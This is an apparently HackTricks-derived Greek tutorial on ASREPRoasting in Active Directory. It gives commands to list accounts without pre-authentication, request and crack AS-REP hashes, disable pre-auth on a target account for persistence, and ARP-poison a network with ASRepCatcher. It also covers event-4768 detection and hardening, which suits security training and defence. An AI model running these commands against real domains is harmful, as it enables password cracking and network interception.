# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες στους οποίους δεν έχει οριστεί το χαρακτηριστικό **Kerberos pre-authentication required**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους attackers να ζητήσουν από τον Domain Controller (DC) authentication για έναν χρήστη χωρίς να χρειάζονται τον κωδικό πρόσβασής του. Στη συνέχεια, ο DC απαντά με ένα μήνυμα κρυπτογραφημένο με ένα κλειδί που προκύπτει από τον κωδικό πρόσβασης του χρήστη, το οποίο οι attackers μπορούν να επιχειρήσουν να κάνουν crack offline για να ανακαλύψουν τον κωδικό πρόσβασης του χρήστη.

Οι βασικές απαιτήσεις για αυτή την επίθεση είναι:

- **Απουσία Kerberos pre-authentication**: Οι χρήστες-στόχοι δεν πρέπει να έχουν ενεργοποιημένη αυτή τη λειτουργία ασφαλείας.
- **Σύνδεση στον Domain Controller (DC)**: Οι attackers χρειάζονται πρόσβαση στον DC για να στείλουν αιτήματα και να λάβουν κρυπτογραφημένα μηνύματα.
- **Προαιρετικός domain account**: Η κατοχή ενός domain account επιτρέπει στους attackers να εντοπίζουν πιο αποτελεσματικά ευάλωτους χρήστες μέσω LDAP queries. Χωρίς τέτοιο account, οι attackers πρέπει να μαντεύουν usernames.

#### Enumerating vulnerable users (need domain credentials)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Αίτημα μηνύματος AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Το Rubeus ζητά **RC4** από προεπιλογή, επομένως το Event ID **4768** συνήθως εμφανίζει **preauth type 0** και **ticket encryption type 0x17**. Αν προσθέσετε **`/aes`** (ή αν το RC4 είναι απενεργοποιημένο για τον στόχο), αναμένετε **AES etypes**.<sup>[[2]](#references)</sup>

#### Γρήγορες εντολές μίας γραμμής (Linux)

- Απαριθμήστε πρώτα πιθανούς στόχους (π.χ. από leaked build paths) με Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Κάντε roast μια ολόκληρη λίστα ονομάτων χρήστη χωρίς έγκυρα creds χρησιμοποιώντας NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Αν έχετε creds, αφήστε το NetExec να κάνει ερώτημα στο LDAP και να ζητήσει για εσάς όλους τους roastable λογαριασμούς: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Αν η έξοδος αρχίζει με **`$krb5asrep$23$`**, κάντε crack με το Hashcat **`-m 18200`**. Αν αρχίζει με **`$krb5asrep$17$`** ή **`$krb5asrep$18$`**, προτιμήστε το John με **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Μην υποθέτετε ότι κάθε AS-REP roast χρησιμοποιεί RC4. Τα σύγχρονα εργαλεία μπορούν να επιστρέψουν **RC4** (`$krb5asrep$23$`) ή **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), ανάλογα με το enctype που ζητήθηκε ή αποτέλεσε αντικείμενο διαπραγμάτευσης. Το **`hashcat -m 18200`** είναι για **etype 23**, ενώ το **John** χειρίζεται απευθείας το `krb5asrep` για **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Επιμονή

Εξαναγκάστε να μην απαιτείται **preauth** για έναν χρήστη για τον οποίο έχετε δικαιώματα **GenericAll** (ή δικαιώματα εγγραφής ιδιοτήτων):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Ανίχνευση και ενίσχυση ασφάλειας

Ένα επιτυχημένο **AS-REP request without preauthentication** δημιουργεί ένα συμβάν **4768** στον DC με `Status=0x0` και `PreAuthType=0`. Αυτό καταγράφει ένα request, όχι απόδειξη ότι κάποιος έσπασε την κρυπτογράφηση της απάντησης ή παραβίασε τον λογαριασμό. Μην απαιτείτε RC4 για την ανίχνευση: το `TicketEncryptionType=0x17` είναι χρήσιμη ένδειξη αδύναμης κρυπτογράφησης, αλλά ένας attacker μπορεί να ζητήσει AES (τιμές αρχείου καταγραφής συμβάντων `0x11`/`0x12`). Στον Windows Server 2016 και νεότερες εκδόσεις, με την αθροιστική ενημέρωση της 14ης Ιανουαρίου 2025 (ή νεότερη), η έκδοση 2 του συμβάντος 4768 εμφανίζει επίσης τα `ClientAdvertizedEncryptionTypes`, τους υποστηριζόμενους τύπους κρυπτογράφησης και τα διαθέσιμα κλειδιά του account/DC.<sup>[[5]](#references)</sup>

Μια πρακτική αναζήτηση εντοπίζει client που διαφημίζει μόνο RC4 ενώ ο λογαριασμός διαθέτει κλειδιά AES και, στη συνέχεια, συσχετίζει αιχμές αιτημάτων από μία διεύθυνση IP προς πολλούς χρήστες χωρίς preauthentication. Καταγράψτε τις νόμιμες εξαιρέσεις ως baseline αντί να δημιουργείτε alert για κάθε συμβάν `PreAuthType=0`.

Για την απόδοση ευθύνης, κανονικοποιήστε το πεδίο `IpAddress` (το οποίο μπορεί να περιέχει IPv4 αντιστοιχισμένη σε `::ffff:`) και συγκρίνετε το χρονικό διάστημά του με συμβάντα service-ticket 4769 ή πρόσβασης σε κοινόχρηστα στοιχεία 5140. Αυτά τα συμβάντα μπορεί να αναφέρουν accounts που ήταν ενεργά από την ίδια διεύθυνση, αλλά ένα AS-REP request χωρίς preauthentication δεν απαιτεί authenticated account. Οι κοινόχρηστοι hosts, τα NAT, οι proxies και οι πολλαπλές sessions σημαίνουν ότι η αντιστοίχιση IP **δεν** ταυτοποιεί το άτομο ή το account που έστειλε το AS-REQ. Αντιμετωπίστε τα σχετικά accounts ως στοιχεία για τη διερεύνηση και επιβεβαιώστε τα με στοιχεία από endpoint ή δίκτυο.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Η μόνιμη λύση είναι να καταργήσετε την επιλογή **Do not require Kerberos preauthentication** σε κάθε χρήστη που δεν τη χρειάζεται αυστηρά και να αλλάξετε τους εκτεθειμένους κωδικούς πρόσβασης λογαριασμών. Αν δεν είναι δυνατή η κατάργηση μιας εξαίρεσης, χρησιμοποιήστε έναν μεγάλο, τυχαία δημιουργημένο κωδικό πρόσβασης και ελάχιστα προνόμια. Η απενεργοποίηση του RC4 αυξάνει το κόστος του cracking, αλλά δεν εξαλείφει τη δυνατότητα offline cracking, καθώς οι απαντήσεις AES AS-REP εξακολουθούν να μπορούν να γίνουν crack offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast χωρίς credentials

Ένας attacker on-path μπορεί να καταγράψει το AS-REP που επιστρέφεται κατά τη διάρκεια μιας κανονικής, authenticated ανταλλαγής AS και να διαμορφώσει το κρυπτογραφημένο τμήμα του για offline cracking. Σε αντίθεση με το κλασικό ASREPRoasting, αυτό δεν απαιτεί `DONT_REQ_PREAUTH`. Ωστόσο, αποδίδει μόνο για accounts των οποίων η ανταλλαγή Kerberos υποκλέπτεται πράγματι. Το **ASRepCatcher** αποκτά αυτή τη θέση με μονόδρομο ARP poisoning από προεπιλογή ή μπορεί να λάβει traffic από άλλη τεχνική MitM με `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Αν θέλετε το σχετικό κόλπο χωρίς credentials που επιστρέφει **service ticket** αντί για **TGT** από principal χωρίς preauthentication, δείτε το [Kerberoast](kerberoast.md).

Στη λειτουργία `relay`, το [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) προωθεί τα AS-REQ που υποκλέπτει και επιβάλλει **RC4** όταν και οι δύο πλευρές εξακολουθούν να το επιτρέπουν. Η λειτουργία `listen` δεν τροποποιεί τα packets και, επομένως, καταγράφει όποιο enctype διαπραγματεύτηκαν ο client και ο DC. Περιορίστε το poisoning με `-t`/`-tf` αντί να επηρεάσετε ολόκληρο το subnet, όταν αυτό είναι εφικτό.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Συμβάν 4768: Ζητήθηκε ένα εισιτήριο ελέγχου ταυτότητας Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Συμβάν ασφαλείας 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Συμβάν ασφαλείας 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
